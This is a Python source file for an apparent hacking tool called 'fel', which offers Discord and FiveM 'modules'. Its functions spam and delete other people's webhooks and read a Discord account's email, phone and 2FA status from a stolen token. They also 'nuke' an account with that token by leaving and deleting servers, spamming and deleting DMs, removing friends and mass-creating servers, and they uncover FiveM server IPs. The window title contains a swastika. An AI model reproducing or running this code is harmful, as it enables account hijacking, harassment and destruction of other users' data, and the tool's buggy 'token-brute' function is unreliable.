import os, colorama, requests, base64, time, sys
from dhooks import Webhook
from colorama import Fore, init
"""version 0.0.3 ALPHA"""
id = 2
animation = "|/-\\"
init(convert=True)
guildsIds = []
friendsIds = []
channelIds = []




    

class fel():
    def __init__(self):
        fel.main()

    def creditssss():
        print(f"""
        Credits
     --------------

         Peber
         -----
     Main Developer
     --------------
   github.com/{Fore.RED}peberhd{Fore.RESET}

         ILOL
         ----
    Second developer
    ----------------
   github.com/{Fore.RED}ilol1337{Fore.RESET}""")          
        fel.main()


    def jsonparser():
        ip = input("Enter IP -> ")
        port = input("Enter Port -> ")
        for i in range(20):
            time.sleep(0.1)
            sys.stdout.write("\r" + animation[i % len(animation)])
            sys.stdout.flush()  
        r = requests.get(f"http://{ip}:{port}/info.json")
        print(r.text)
        fel.main()

    def cfxfinder():
        cfx = input("\nEnter CFX -> ")
        for i in range(20):
            time.sleep(0.1)
            sys.stdout.write("\r" + animation[i % len(animation)])
            sys.stdout.flush()          
        r = requests.get(f"https://{cfx}")

        response = r.headers['x-citizenfx-url']
        httpstrip = response.strip("https://")
        print(f"{httpstrip}\n")
        fel.main()

    def resourcecheck():
        print("""
Recommended searches
----------- --------
- vrp_mysql
- runcode
- vrp_trucker""")
        serverip = input('\nEnter IP -> ')
        serverport = input('Enter Port -> ')
        for i in range(20):
            time.sleep(0.1)
            sys.stdout.write("\r" + animation[i % len(animation)])
            sys.stdout.flush()  
        fulladdress = requests.get(f"http://{serverip}:{serverport}/info.json")
        keyword = input('\nResource -> ')
        if keyword in fulladdress.text:
            print(f'Found [{keyword}] in server\n')
            fel.main()
        else:
            print(f"Didn't find [{keyword}] in results")
            fel.main()

    def fivemserverinfo():
        ip = input(f'Enter IP -> ')
        port = input(f'Enter Port -> ')
        for i in range(20):
            time.sleep(0.1)
            sys.stdout.write("\r" + animation[i % len(animation)])
            sys.stdout.flush()          
        r = requests.get(f'http://{ip}:{port}/Dynamic.json')

        if "DevoNetwork" in r.text:
            print(f"Serveren er:     [DevoNetwork]")

        elif "Freeroam" in r.text:
            print(f"Serveren er:     [Freeroam]")

        elif "Freeroam" in r.text:
            print(f"Serveren er:     [RolePlay]")

        elif "hg" in r.text:
            print(f"Serveren er:     [hg]")

        elif "Custom_Framework_ESX" in r.text:
            print(f"Serveren er:     [Custom_Framework_ESX]")

        else:
            print("Couldn't find resources")

        fel.main()

        print(f"----------------------------------------------------------------------")
        os.system("pause")

    def jsonlinkfinder():
        ip = input(f'Enter IP -> ')
        port = input(f'Enter Port -> ')
        print(f'''
Dynamic:         http://{ip}:{port}/Dynamic.json
Players_json:    http://{ip}:{port}/Players.json
info =           http://{ip}:{port}/Info.json
        ''')

        fel.main()


    def webhook_check(): 
        webhook = input("Enter Webhook -> ")    
        webhook = requests.get(webhook)
        if webhook.status_code == 200:
            print("Webhook valid")

        else:
            print('Webhook invalid')

        fel.main()

         
    def webhook_spam():
        webhook = input("Enter Webhook -> ")
        text_webhook = input("Enter Message -> ")
        webhook_spam = int(input("How many messages -> "))
        for fdsfdsf in range(webhook_spam):
            time_spam = 5
            print("Rate limit")
            time.sleep(time_spam + 4) 
            print("Spamming!")             
            for spam in range(27):  
                hook11 = Webhook(f"{webhook}") 
                data = f"{text_webhook}"
                hook11.send(data)  



        fel.main()
    def delete_webhook():
        webhook = input("Enter Webhook -> ") 
        requests.delete(webhook)
        check = requests.get(webhook)
        if check.status_code == 404:
            print("\nWebhook has being deleted!")

        else:
            print("\nUnable to delete webhook")

        fel.main()           

    def account_info():
        token = input("Token -> ")        
        headers = {'Authorization': token, 'Content-Type': 'application/json'}  
        r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
        if r.status_code == 200:
                userName = r.json()['username'] + '#' + r.json()['discriminator']
                userID = r.json()['id']
                phone = r.json()['phone']
                email = r.json()['email']
                mfa = r.json()['mfa_enabled']
                print(f'''
User ID:        {userID}
User Name:      {userName}
2 Factor:       {mfa}
Email:          {email}
Phone number:   {phone if phone else ""}
Token:          {token}
                ''') 
        fel.main()                 

    def account_nuke_whunowork():
        token = input("Token -> ")           
        invite = input('Server invite (your own "if u have")->' )
        userGuilds = requests.get('https://discord.com/api/v9/users/@me/guilds', headers={'Authorization': token}).json()
        guildIds = []
        userFriends = requests.get('https://discord.com/api/v9/users/@me/relationships', headers={'Authorization': token}).json()
        userDms = requests.get('https://discord.com/api/v9/users/@me/channels', headers={'Authorization': token}).json()
        dmIds = []
        friendIds = []
        guildName = input('Guild names(s) -> ')
        message = input('Spam dm message -> ')
        bio = input('New Bio -> ')

        requests.patch('https://discord.com/api/v9/users/@me', headers={'Authorization': token}, json={'bio':bio})

        for guild in userGuilds:
            guildIds.append(guild['id'])

        for id in guildIds:
            requests.delete(f'https://discord.com/api/v9/users/@me/guilds/{id}', headers={'Authorization': token})

        for id in guildIds:
            requests.delete(f'https://discord.com/api/v9/guilds/{id}', headers={'Authorization': token})

        for dm in userDms:
            dmIds.append(dm['id'])

        for id in dmIds:
            requests.post(f'https://discord.com/api/v9/channels/{id}/messages', headers={'Authorization': token}, json={'content': message})
            requests.delete(f'https://discord.com/api/v9/channels/{id}', headers={'Authorization': token})

        for friend in userFriends:
            friendIds.append(friend['id'])

        for id in friendIds:
            requests.delete(f'https://discord.com/api/v9/users/@me/relationships/{id}', headers={'Authorization': token})

        for i in range(99):
            requests.post('https://discord.com/api/v9/guilds', headers={'Authorization': token}, json={'name': guildName, 'region': 'europe'})

        requests.post(f'https://discord.com/api/v9/invites/{invite}', headers={'Authorization': token})
        fel.main()   

    def token_brute(): 
        userid = input('UserID -> ')
        userid_bytes = userid.encode('ascii')
        base64_bytes = base64.b64encode(userid_bytes)
        base64_message = base64_bytes.decode('ascii')
        print(f'Token: {base64_message}   \nEDIT: Dont work if they have 2FA')
        fel.main()

    def anti_tokengrab():
        choice = input("File path-> ")      
        print("Dont work right now please wait...")
        fel.main()

    def webhookcustommessage():
        webhook = input("Enter Webhook -> ")
        repeattimes = int(input("How many times do you want to repeat this? -> "))
        for custommes in range(repeattimes):
            text_webhook_custom = input("Enter Message -> ")            
            hookcustom = Webhook(f"{webhook}") 
            datacustom = f"{text_webhook_custom}"
            hookcustom.send(datacustom)  
        fel.main() 


    def main():
        choice = input("\n-> ")

        if choice == 'help':
            print(f"""        
| help: shows this screen
| clear: clears the screen
| modules: shows all modules
| credits: shows credits""")
            fel.main()

        
         

        elif choice == 'clear':
            os.system('cls; clear')
            print(f"""         
| fel    
| version 0.0.3

        type help to show all commands""")
            fel.main()

        elif choice == 'credits':
            fel.creditssss()
         
        elif choice == 'modules':
            print("""
        
| fivem
| discord""")
            fel.main()

        elif choice == 'discord':
            print("""
| webhook-spam: spams a specified webhook
| webhook-check: checks if webhooks works
| webhook-custom: sends custom message to webhook
| webhook-delete: deletes webhook
| account-info: gets info with token
| account-nuke: nukes account with token 
| group-crash: crashes a discord group with token
| account-hyper: changes hyper squad 
| token-brute: bruteforces account with ID
| anti-tokengrab: checkes files for token/rat
""")
            fel.main()

        elif choice == 'webhook-custom':
            fel.webhookcustommessage()

        elif choice == 'group-crash':
            os.system("py grupcrash.py")

        elif choice == 'group-crash':
            os.system("py grupcrash.py")

        elif choice == 'account-info':
            fel.account_info()
        elif choice == 'anti-tokengrab':
            fel.anti_tokengrab()
        elif choice == 'token-brute':
            fel.token_brute()
        elif choice == 'webhook-spam':
            fel.webhook_spam()

        elif choice == 'webhook-delete':
            fel.delete_webhook()

        elif choice == 'webhook-check':
            fel.webhook_check()

        elif choice == 'account-nuke':
            fel.account_nuke_whunowork()  
                      
        elif choice == 'fivem':
            print("""
| cfx-finder: finds ip of any server
| json-parser: parses resources from a server
| server-info: finds server info
| resource-check: check a specified resource on a server
| json-link: Finds json files from ip and port
""")
            fel.main()

        elif choice == 'json-parser':
            fel.jsonparser()

        elif choice == 'json-link':
            fel.jsonlinkfinder()

        elif choice == 'cfx-finder':
            fel.cfxfinder()

        elif choice == 'server-info':
            fel.fivemserverinfo()

        elif choice == 'resource-check':
            fel.resourcecheck()

        else:
            for i in range(20):
                time.sleep(0.1)
                sys.stdout.write("\r" + animation[i % len(animation)])
                sys.stdout.flush()            
            print('Not a valid arguement')   
            fel.main()

if __name__ == '__main__':
    os.system(f'cls; clear && title FEL [User ID: {id}] 卍')
    print(f"""
| fel                          
| version 0.0.3
        type help to show all commands""")



    fel()



